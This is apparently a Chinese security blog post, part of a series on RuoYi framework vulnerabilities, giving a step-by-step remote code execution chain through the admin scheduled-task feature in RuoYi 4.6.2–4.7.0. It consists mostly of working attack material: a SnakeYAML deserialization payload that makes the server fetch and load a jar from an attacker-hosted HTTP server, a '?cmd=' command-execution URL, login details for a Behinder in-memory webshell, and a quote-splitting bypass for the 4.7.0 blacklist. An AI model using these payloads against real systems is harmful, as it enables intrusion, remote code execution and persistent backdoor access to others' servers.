#  Ruoyi单应用版本漏洞合集2  
原创 安全艺术  安全艺术   2026-01-12 04:00  
  
# 1. RuoYi 4.6.2-4.7.0后台定时任务RCE（snakeyaml）  
## 1.1. RuoYi<=4.6.2  
  
py2  
```
python -m SimpleHTTPServer 8888
```  
  
py3  
```
python -m http.server 8888
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OrrOkw9FBxhrkVtgt28teUabf7XicSSFIFFpuJkcUWnqL0XfiavWlNbP6GrB1SdzgG6tJGJEsUusgfA/640?wx_fmt=png&from=appmsg "")  
  
系统监控-定时任务  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OrrOkw9FBxhrkVtgt28teUau6yggsF5vA3qgTibfFotp4icr2AcnnedJHLiaiaK4MI7JJXkVO9SslEG0Q/640?wx_fmt=png&from=appmsg "")  
```
org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://192.168.3.102:8888/yaml-payload-for-ruoyi-1.0-SNAPSHOT.jar"]]]]')
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OrrOkw9FBxhrkVtgt28teUakFXgraz2mdgdR4fReOUSlVGn9DEKeZk5icylS8Qfx8qODeED5ibzuLuw/640?wx_fmt=png&from=appmsg "")  
  
命令执行：  
  
http://192.168.3.102/login?cmd=whoami  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OrrOkw9FBxhrkVtgt28teUazKItruFQ0etWibu8wOf4dCkwUuPJpVFAQibztiaoaJaGs0iaF7EedyEuUw/640?wx_fmt=png&from=appmsg "")  
  
连接冰蝎：/login?cmd=1（cmd不为空即可），密码为rebeyond，使用冰蝎正常连接即可  
  
http://192.168.3.102/login?cmd=1  
  
密码：  
rebeyond  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OrrOkw9FBxhrkVtgt28teUav4PRxxGmX0eC2cAD1JtTCVz8O5dTtHWeq3GA6GDTOjS03zKFla71DQ/640?wx_fmt=png&from=appmsg "")  
  
卸载内存马：  
  
http://192.168.3.102/login?cmd=delete  
## 1.2. RuoYi-4.7.0  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OrrOkw9FBxhrkVtgt28teUao1ZvnkCibLzibFrGatbic4iaIcyyF20lszftWgdAWzTJwJ6ex7JCszxGxw/640?wx_fmt=png&from=appmsg "")  
  
绕过  
```
org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["h't't'p://192.168.3.102:8888/yaml-payload-for-ruoyi-1.0-SNAPSHOT.jar"]]]]')
```  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/X5epWh2K2OqGV96ZzTxicUCt4bRricmUCiaclQKEbDgHRZaGX5I4tJFTvDribb3HVSz087SEshTHUsvp1GyZrYc3hA/640?wx_fmt=jpeg&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=24 "")  
  
